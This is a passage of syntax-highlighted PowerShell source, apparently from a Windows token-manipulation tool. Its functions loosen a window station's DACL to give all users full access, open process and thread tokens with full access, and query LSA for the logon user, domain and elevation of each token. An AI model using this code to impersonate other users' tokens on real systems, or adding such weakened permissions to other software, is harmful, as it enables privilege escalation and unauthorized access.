            <span class="token variable">$TrusteeObj</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TrusteePtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TRUSTEE</span><span class="token punctuation">)</span>
            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TrusteePtr</span><span class="token punctuation">)</span>
            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>pMultipleTrustee = <span class="token namespace">[IntPtr]</span>::Zero
            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>MultipleTrusteeOperation = 0
            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>TrusteeForm = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TRUSTEE_IS_SID
            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>TrusteeType = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TRUSTEE_IS_WELL_KNOWN_GROUP
            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>ptstrName = <span class="token variable">$pAllUsersSid</span>

            <span class="token comment" spellcheck="true">#Give full permission</span>
            <span class="token variable">$ExplicitAccessSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$EXPLICIT_ACCESS</span><span class="token punctuation">)</span>
            <span class="token variable">$ExplicitAccessPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$ExplicitAccessSize</span><span class="token punctuation">)</span>
            <span class="token variable">$ExplicitAccess</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$ExplicitAccessPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$EXPLICIT_ACCESS</span><span class="token punctuation">)</span>
            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$ExplicitAccessPtr</span><span class="token punctuation">)</span>
            <span class="token variable">$ExplicitAccess</span><span class="token punctuation">.</span>grfAccessPermissions = 0xf03ff
            <span class="token variable">$ExplicitAccess</span><span class="token punctuation">.</span>grfAccessMode = <span class="token variable">$Win32constants</span><span class="token punctuation">.</span>GRANT_ACCESS
            <span class="token variable">$ExplicitAccess</span><span class="token punctuation">.</span>grfInheritance = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>OBJECT_INHERIT_ACE
            <span class="token variable">$ExplicitAccess</span><span class="token punctuation">.</span>Trustee = <span class="token variable">$TrusteeObj</span>

            <span class="token namespace">[IntPtr]</span><span class="token variable">$NewDacl</span> = <span class="token namespace">[IntPtr]</span>::Zero

            <span class="token variable">$RetVal</span> = <span class="token variable">$SetEntriesInAclW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span>1<span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ExplicitAccess</span><span class="token punctuation">,</span> <span class="token variable">$ppDacl</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NewDacl</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$RetVal</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Error</span> <span class="token string">"Error calling SetEntriesInAclW: <span class="token variable">$RetVal</span>"</span>
            <span class="token punctuation">}</span>

            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$pAllUsersSid</span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$NewDacl</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token string">"New DACL is null"</span>
            <span class="token punctuation">}</span>

            <span class="token comment" spellcheck="true">#0x7 is window station, change for other types</span>
            <span class="token variable">$RetVal</span> = <span class="token variable">$SetSecurityInfo</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hObject</span><span class="token punctuation">,</span> 0x7<span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>DACL_SECURITY_INFORMATION<span class="token punctuation">,</span> <span class="token variable">$ppSidOwner</span><span class="token punctuation">,</span> <span class="token variable">$ppSidGroup</span><span class="token punctuation">,</span> <span class="token variable">$NewDacl</span><span class="token punctuation">,</span> <span class="token variable">$ppSacl</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$RetVal</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Error</span> <span class="token string">"SetSecurityInfo failed. Return value: <span class="token variable">$RetVal</span>"</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$LocalFree</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ppSecurityDescriptor</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Get the primary token for the specified processId</span>
    <span class="token keyword">function</span> Get<span class="token operator">-</span>PrimaryToken
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>
            <span class="token namespace">[UInt32]</span>
            <span class="token variable">$ProcessId</span><span class="token punctuation">,</span>

            <span class="token comment" spellcheck="true">#Open the token with all privileges. Requires SYSTEM because some of the privileges are restricted to SYSTEM.</span>
            <span class="token namespace">[Parameter()]</span>
            <span class="token namespace">[Switch]</span>
            <span class="token variable">$FullPrivs</span>
        <span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$FullPrivs</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$TokenPrivs</span> = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ALL_ACCESS
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$TokenPrivs</span> = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ASSIGN_PRIMARY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_DUPLICATE <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_IMPERSONATE <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY 
        <span class="token punctuation">}</span>

        <span class="token variable">$ReturnStruct</span> = <span class="token function">New-Object</span> PSObject

        <span class="token variable">$hProcess</span> = <span class="token variable">$OpenProcess</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>PROCESS_QUERY_INFORMATION<span class="token punctuation">,</span> <span class="token boolean">$true</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token variable">$ProcessId</span><span class="token punctuation">)</span>
        <span class="token variable">$ReturnStruct</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name hProcess <span class="token operator">-</span>Value <span class="token variable">$hProcess</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hProcess</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">#If a process is a protected process it cannot be enumerated. This call should only fail for protected processes.</span>
            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token function">Write-Verbose</span> <span class="token string">"Failed to open process handle for ProcessId: <span class="token variable">$ProcessId</span>. ProcessName<span class="token function"> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Process</span> <span class="token operator">-</span>Id <span class="token variable">$ProcessId</span><span class="token punctuation">)</span></span>.Name). Error code: <span class="token variable">$ErrorCode</span> . This is likely because this is a protected process."</span>
            <span class="token keyword">return</span> <span class="token variable">$null</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token namespace">[IntPtr]</span><span class="token variable">$hProcToken</span> = <span class="token namespace">[IntPtr]</span>::Zero
            <span class="token variable">$Success</span> = <span class="token variable">$OpenProcessToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hProcess</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivs</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$hProcToken</span><span class="token punctuation">)</span>

            <span class="token comment" spellcheck="true">#Close the handle to hProcess (the process handle)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hProcess</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token function">Write-Warning</span> <span class="token string">"Failed to close process handle, this is unexpected. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$hProcess</span> = <span class="token namespace">[IntPtr]</span>::Zero

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Success</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span> <span class="token operator">-or</span> <span class="token variable">$hProcToken</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token function">Write-Warning</span> <span class="token string">"Failed to get processes primary token. ProcessId: <span class="token variable">$ProcessId</span>. ProcessName<span class="token function"> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Process</span> <span class="token operator">-</span>Id <span class="token variable">$ProcessId</span><span class="token punctuation">)</span></span>.Name). Error: <span class="token variable">$ErrorCode</span>"</span>
                <span class="token keyword">return</span> <span class="token variable">$null</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ReturnStruct</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name hProcToken <span class="token operator">-</span>Value <span class="token variable">$hProcToken</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token variable">$ReturnStruct</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">function</span> Get<span class="token operator">-</span>ThreadToken
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>
            <span class="token namespace">[UInt32]</span>
            <span class="token variable">$ThreadId</span>
        <span class="token punctuation">)</span>

        <span class="token variable">$TokenPrivs</span> = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ALL_ACCESS

        <span class="token variable">$RetStruct</span> = <span class="token function">New-Object</span> PSObject
        <span class="token namespace">[IntPtr]</span><span class="token variable">$hThreadToken</span> = <span class="token namespace">[IntPtr]</span>::Zero

        <span class="token variable">$hThread</span> = <span class="token variable">$OpenThread</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>THREAD_ALL_ACCESS<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token variable">$ThreadId</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hThread</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-ne</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_INVALID_PARAMETER<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#The thread probably no longer exists</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Warning</span> <span class="token string">"Failed to open thread handle for ThreadId: <span class="token variable">$ThreadId</span>. Error code: <span class="token variable">$ErrorCode</span>"</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$Success</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hThread</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivs</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$hThreadToken</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-ne</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_NO_TOKEN<span class="token punctuation">)</span> <span class="token operator">-and</span>  <span class="token comment" spellcheck="true">#This error is returned when the thread isn't impersonated</span>
                 <span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-ne</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_INVALID_PARAMETER<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#Probably means the thread was closed</span>
                <span class="token punctuation">{</span>
                    <span class="token function">Write-Warning</span> <span class="token string">"Failed to call OpenThreadToken for ThreadId: <span class="token variable">$ThreadId</span>. Error code: <span class="token variable">$ErrorCode</span>"</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Verbose</span> <span class="token string">"Successfully queried thread token"</span>
            <span class="token punctuation">}</span>

            <span class="token comment" spellcheck="true">#Close the handle to hThread (the thread handle)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hThread</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token function">Write-Warning</span> <span class="token string">"Failed to close thread handle, this is unexpected. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$hThread</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token punctuation">}</span>

        <span class="token variable">$RetStruct</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name hThreadToken <span class="token operator">-</span>Value <span class="token variable">$hThreadToken</span>
        <span class="token keyword">return</span> <span class="token variable">$RetStruct</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Gets important information about the token such as the logon type associated with the logon</span>
    <span class="token keyword">function</span> Get<span class="token operator">-</span>TokenInformation
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>
            <span class="token namespace">[IntPtr]</span>
            <span class="token variable">$hToken</span>
        <span class="token punctuation">)</span>

        <span class="token variable">$ReturnObj</span> = <span class="token variable">$null</span>

        <span class="token variable">$TokenStatsSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_STATISTICS</span><span class="token punctuation">)</span>
        <span class="token namespace">[IntPtr]</span><span class="token variable">$TokenStatsPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenStatsSize</span><span class="token punctuation">)</span>
        <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0
        <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenStatistics<span class="token punctuation">,</span> <span class="token variable">$TokenStatsPtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenStatsSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed. Error code: <span class="token variable">$ErrorCode</span>"</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$TokenStats</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenStatsPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_STATISTICS</span><span class="token punctuation">)</span>

            <span class="token comment" spellcheck="true">#Query LSA to determine what the logontype of the session is that the token corrosponds to, as well as the username/domain of the logon</span>
            <span class="token variable">$LuidPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::StructureToPtr<span class="token punctuation">(</span><span class="token variable">$TokenStats</span><span class="token punctuation">.</span>AuthenticationId<span class="token punctuation">,</span> <span class="token variable">$LuidPtr</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>

            <span class="token namespace">[IntPtr]</span><span class="token variable">$LogonSessionDataPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero
            <span class="token variable">$ReturnVal</span> = <span class="token variable">$LsaGetLogonSessionData</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$LogonSessionDataPtr</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ReturnVal</span> <span class="token operator">-ne</span> 0 <span class="token operator">-and</span> <span class="token variable">$LogonSessionDataPtr</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Warning</span> <span class="token string">"Call to LsaGetLogonSessionData failed. Error code: <span class="token variable">$ReturnVal</span>. LogonSessionDataPtr = <span class="token variable">$LogonSessionDataPtr</span>"</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$LogonSessionData</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LogonSessionDataPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$SECURITY_LOGON_SESSION_DATA</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>Username<span class="token punctuation">.</span>Buffer <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero <span class="token operator">-and</span> 
                    <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>LoginDomain<span class="token punctuation">.</span>Buffer <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">#Get the username and domainname associated with the token</span>
                    <span class="token variable">$Username</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>Username<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>Username<span class="token punctuation">.</span>Length<span class="token operator">/</span>2<span class="token punctuation">)</span>
                    <span class="token variable">$Domain</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>LoginDomain<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>LoginDomain<span class="token punctuation">.</span>Length<span class="token operator">/</span>2<span class="token punctuation">)</span>

                    <span class="token comment" spellcheck="true">#If UserName is for the computer account, figure out what account it actually is (SYSTEM, NETWORK SERVICE)</span>
                    <span class="token comment" spellcheck="true">#Only do this for the computer account because other accounts return correctly. Also, doing this for a domain account </span>
                    <span class="token comment" spellcheck="true">#results in querying the domain controller which is unwanted.</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Username</span> <span class="token operator">-</span>ieq <span class="token string"><span class="token function">"$<span class="token punctuation">(</span><span class="token variable">$env</span>:COMPUTERNAME<span class="token punctuation">)</span></span>`$"</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token namespace">[UInt32]</span><span class="token variable">$Size</span> = 100
                        <span class="token namespace">[UInt32]</span><span class="token variable">$NumUsernameChar</span> = <span class="token variable">$Size</span> <span class="token operator">/</span> 2
                        <span class="token namespace">[UInt32]</span><span class="token variable">$NumDomainChar</span> = <span class="token variable">$Size</span> <span class="token operator">/</span> 2
                        <span class="token namespace">[UInt32]</span><span class="token variable">$SidNameUse</span> = 0
                        <span class="token variable">$UsernameBuffer</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$Size</span><span class="token punctuation">)</span>
                        <span class="token variable">$DomainBuffer</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$Size</span><span class="token punctuation">)</span>
                        <span class="token variable">$Success</span> = <span class="token variable">$LookupAccountSidW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>Sid<span class="token punctuation">,</span> <span class="token variable">$UsernameBuffer</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NumUsernameChar</span><span class="token punctuation">,</span> <span class="token variable">$DomainBuffer</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NumDomainChar</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$SidNameUse</span><span class="token punctuation">)</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Success</span><span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$Username</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$UsernameBuffer</span><span class="token punctuation">)</span>
                            <span class="token variable">$Domain</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$DomainBuffer</span><span class="token punctuation">)</span>
                        <span class="token punctuation">}</span>
                        <span class="token keyword">else</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                            <span class="token function">Write-Warning</span> <span class="token string">"Error calling LookupAccountSidW. Error code: <span class="token variable">$ErrorCode</span>"</span>
                        <span class="token punctuation">}</span>

                        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$UsernameBuffer</span><span class="token punctuation">)</span>
                        <span class="token variable">$UsernameBuffer</span> = <span class="token namespace">[IntPtr]</span>::Zero
                        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$DomainBuffer</span><span class="token punctuation">)</span>
                        <span class="token variable">$DomainBuffer</span> = <span class="token namespace">[IntPtr]</span>::Zero
                    <span class="token punctuation">}</span>

                    <span class="token variable">$ReturnObj</span> = <span class="token function">New-Object</span> PSObject
                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name Domain <span class="token operator">-</span>Value <span class="token variable">$Domain</span>
                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name Username <span class="token operator">-</span>Value <span class="token variable">$Username</span>    
                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name hToken <span class="token operator">-</span>Value <span class="token variable">$hToken</span>
                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name LogonType <span class="token operator">-</span>Value <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>LogonType


                    <span class="token comment" spellcheck="true">#Query additional info about the token such as if it is elevated</span>
                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name IsElevated <span class="token operator">-</span>Value <span class="token boolean">$false</span>

                    <span class="token variable">$TokenElevationSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_ELEVATION</span><span class="token punctuation">)</span>
                    <span class="token variable">$TokenElevationPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenElevationSize</span><span class="token punctuation">)</span>
                    <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0
                    <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenElevation<span class="token punctuation">,</span> <span class="token variable">$TokenElevationPtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenElevationSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: <span class="token variable">$ErrorCode</span>"</span> 
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
